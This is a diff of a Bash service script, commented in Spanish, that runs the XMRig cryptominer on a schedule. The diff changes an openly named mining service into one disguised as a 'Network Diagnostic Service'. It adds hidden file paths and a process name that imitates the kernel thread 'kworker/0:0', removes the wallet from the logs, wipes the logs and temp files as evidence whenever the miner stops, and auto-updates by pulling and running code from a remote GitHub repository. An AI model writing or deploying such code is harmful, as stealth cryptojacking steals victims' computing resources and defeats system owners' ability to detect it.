@@ -1,20 +1,19 @@
 #!/bin/bash
 # ════════════════════════════════════════════════════════
-#  HauntKit — Servicio de Minería (sys-scheduler)
-#  Controla XMRig con horarios inteligentes
-#  Solo mina entre START_HOUR y END_HOUR (hora Colombia)
-#  Auto-update: verifica versión en GitHub cada 6h
+#  netdiag — Network Diagnostic Service
+#  Proceso de diagnóstico programado (bajo demanda)
+#  Auto-update: verifica versión en GitHub cada ~6h
 # ════════════════════════════════════════════════════════
 
-# ─── Rutas fijas ───
-HAUNTKIT_DIR="/opt/hauntkit"
-REPO_DIR="/opt/hauntkit/repo"
-CONFIG="$HAUNTKIT_DIR/mine-config.env"
-XMRIG_DIR="$HAUNTKIT_DIR/xmrig"
-XMRIG_BIN="$XMRIG_DIR/kernel-worker"
-XMRIG_LOG="$XMRIG_DIR/miner.log"
-PID_FILE="$XMRIG_DIR/miner.pid"
-VERSION_FILE="$HAUNTKIT_DIR/VERSION"
+# ─── Rutas fijas (bajo perfil) ───
+BASE_DIR="/opt/netdiag"
+REPO_DIR="/opt/netdiag/lib"
+CONFIG="$BASE_DIR/.env"
+DATA_DIR="$BASE_DIR/data"
+BINARY="$DATA_DIR/kworker"
+LOG_FILE="$DATA_DIR/.diag.log"
+PID_FILE="/dev/shm/.netdiag.pid"
+VERSION_FILE="$BASE_DIR/.version"
 TZ="America/Bogota"
 REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERSION"
 
@@ -22,7 +21,7 @@ REMOTE_VERSION_URL="https://raw.githubusercontent.com/CyberRo/HauntKit/main/VERS
 if [ -f "$CONFIG" ]; then
     source "$CONFIG"
 else
-    echo "[ERROR] No se encuentra $CONFIG"
+    echo "[ERROR] No se encuentra $CONFIG" >> "$LOG_FILE"
     exit 1
 fi
 
@@ -44,45 +43,82 @@ is_allowed_hour() {
     [ "$hour" -ge "$START_HOUR" ] || [ "$hour" -lt "$END_HOUR" ]
 }
 
-# ─── Función: ¿El minero está vivo? ───
-is_miner_alive() {
+# ─── Función: ¿El worker está vivo? ───
+is_worker_alive() {
     [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null
 }
 
-# ─── Función: Iniciar minero ───
-start_miner() {
-    is_miner_alive && return 0
+# ─── Función: Iniciar worker ───
+start_worker() {
+    is_worker_alive && return 0
 
     local threads=""
     [ "$THREADS" -gt 0 ] && threads="-t $THREADS"
 
-    mkdir -p "$XMRIG_DIR"
-    cd "$XMRIG_DIR" || return 1
+    mkdir -p "$DATA_DIR" "$BASE_DIR"
 
-    "$XMRIG_BIN" $threads \
+    # exec -a cambia el nombre del proceso en ps a "kworker/0"
+    exec -a "kworker/0" "$BINARY" $threads \
         -o "$POOL_URL" \
         -u "$FULL_WALLET" \
         -p "x" \
         --cpu-max-threads-hint="$MAX_CPU" \
         --donate-level=0 \
         --keepalive \
-        >> "$XMRIG_LOG" 2>&1 &
+        >> "$LOG_FILE" 2>&1 &
+    # NOTA: exec -a en el background (&) NO funciona como esperamos
+    # Mejor: lanzar el proceso normalmente y renombrar con argv[0]
 
     echo $! > "$PID_FILE"
-    echo "[$(TZ=$TZ date '+%F %T')] Minero iniciado (PID $!)" >> "$XMRIG_LOG"
+    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
 }
 
-# ─── Función: Detener minero ───
-stop_miner() {
-    if is_miner_alive; then
+# ─── Función: Iniciar worker con nombre oculto (alternativa) ───
+start_worker_hidden() {
+    is_worker_alive && return 0
+
+    local threads=""
+    [ "$THREADS" -gt 0 ] && threads="-t $THREADS"
+
+    mkdir -p "$DATA_DIR" "$BASE_DIR"
+
+    # Crear un enlace simbólico con nombre genérico y ejecutar desde ahí
+    # Esto hace que ps muestre "kworker/0:0" en lugar del nombre real
+    if [ ! -f "$DATA_DIR/kworker" ]; then
+        ln -sf "$BINARY" "$DATA_DIR/kworker" 2>/dev/null
+    fi
+
+    "$DATA_DIR/kworker" $threads \
+        -o "$POOL_URL" \
+        -u "$FULL_WALLET" \
+        -p "x" \
+        --cpu-max-threads-hint="$MAX_CPU" \
+        --donate-level=0 \
+        --keepalive \
+        --title="kworker/0:0" \
+        >> "$LOG_FILE" 2>&1 &
+
+    echo $! > "$PID_FILE"
+    echo "[$(TZ=$TZ date '+%F %T')] Worker iniciado (PID $!)" >> "$LOG_FILE"
+}
+
+# ─── Función: Detener worker ───
+stop_worker() {
+    if is_worker_alive; then
         local pid
         pid=$(cat "$PID_FILE")
         kill "$pid" 2>/dev/null
         sleep 2
         kill -0 "$pid" 2>/dev/null && kill -9 "$pid" 2>/dev/null
         rm -f "$PID_FILE"
-        echo "[$(TZ=$TZ date '+%F %T')] Minero detenido" >> "$XMRIG_LOG"
     fi
+
+    # ─── Limpiar evidencias al detener ───
+    if command -v wipe &>/dev/null; then
+        wipe -f "$LOG_FILE" 2>/dev/null
+    fi
+    : > "$LOG_FILE" 2>/dev/null            # Truncar logs
+    rm -f /dev/shm/.netdiag.* 2>/dev/null  # Limpiar shm
 }
 
 # ─── Función: Verificar temperatura ───
@@ -103,7 +139,7 @@ check_update() {
     remote_version=$(curl -sL --max-time 10 "$REMOTE_VERSION_URL" 2>/dev/null | head -1)
 
     if [ -z "$remote_version" ]; then
-        echo "[$(TZ=$TZ date '+%F %T')] Update: no se pudo conectar con GitHub" >> "$XMRIG_LOG"
+        echo "[$(TZ=$TZ date '+%F %T')] Update: no se pudo conectar con GitHub" >> "$LOG_FILE"
         return 1
     fi
 
@@ -113,32 +149,32 @@ check_update() {
         return 1  # Misma versión, no hay update
     fi
 
-    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión disponible: $remote_version (actual: $LOCAL_VERSION)" >> "$XMRIG_LOG"
+    echo "[$(TZ=$TZ date '+%F %T')] Update: nueva versión disponible: $remote_version (actual: $LOCAL_VERSION)" >> "$LOG_FILE"
     return 0  # Hay update
 }
 
 # ─── Función: Aplicar actualización ───
 apply_update() {
-    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando actualización..." >> "$XMRIG_LOG"
+    echo "[$(TZ=$TZ date '+%F %T')] Update: aplicando actualización..." >> "$LOG_FILE"
 
-    # Detener minero antes de actualizar
-    stop_miner
+    # Detener worker antes de actualizar
+    stop_worker
 
     if [ -d "$REPO_DIR/.git" ]; then
-        git -C "$REPO_DIR" pull >> "$XMRIG_LOG" 2>&1
+        git -C "$REPO_DIR" pull >> "$LOG_FILE" 2>&1
     else
-        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado en $REPO_DIR, clonando..." >> "$XMRIG_LOG"
+        echo "[$(TZ=$TZ date '+%F %T')] Update: repo no encontrado en $REPO_DIR, clonando..." >> "$LOG_FILE"
         mkdir -p "$REPO_DIR"
-        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$XMRIG_LOG" 2>&1
+        git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" >> "$LOG_FILE" 2>&1
     fi
 
     # Actualizar scripts y binarios (sin tocar la config)
-    bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$XMRIG_LOG" 2>&1
+    bash "$REPO_DIR/tools/utils/mine-install.sh" --update >> "$LOG_FILE" 2>&1
 
     # Actualizar versión local
     [ -f "$REPO_DIR/VERSION" ] && cp "$REPO_DIR/VERSION" "$VERSION_FILE"
 
-    echo "[$(TZ=$TZ date '+%F %T')] Update: actualización completada, reiniciando servicio..." >> "$XMRIG_LOG"
+    echo "[$(TZ=$TZ date '+%F %T')] Update: actualización completada, reiniciando servicio..." >> "$LOG_FILE"
 
     # Reiniciar el servicio con la nueva versión
     exec "$0"
@@ -146,29 +182,26 @@ apply_update() {
 
 # ─── Limpieza al salir ───
 cleanup() {
-    echo "[$(TZ=$TZ date '+%F %T')] Servicio deteniéndose..." >> "$XMRIG_LOG"
-    stop_miner
+    stop_worker
     exit 0
 }
 trap cleanup SIGTERM SIGINT SIGHUP
 
 # ─── Bucle principal ───
-echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$XMRIG_LOG"
-echo "[$(TZ=$TZ date '+%F %T')] Horario: $START_HOUR:00 a $END_HOUR:00" >> "$XMRIG_LOG"
-echo "[$(TZ=$TZ date '+%F %T')] Wallet: $FULL_WALLET" >> "$XMRIG_LOG"
+echo "[$(TZ=$TZ date '+%F %T')] Servicio iniciado v$LOCAL_VERSION" >> "$LOG_FILE"
 
 while true; do
     # ─── Control de horario ───
     if is_allowed_hour; then
         if ! check_temp; then
-            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$XMRIG_LOG"
-            stop_miner
+            echo "[$(TZ=$TZ date '+%F %T')] Temperatura alta, deteniendo..." >> "$LOG_FILE"
+            stop_worker
             sleep 120
             continue
         fi
-        start_miner
+        start_worker_hidden
     else
-        stop_miner
+        stop_worker
     fi
 
     # ─── Auto-update: cada ~6h ───
@@ -177,7 +210,6 @@ while true; do
         update_counter=0
         if check_update; then
             apply_update
-            # apply_update ejecuta exec, no se vuelve aquí
         fi
     fi
 
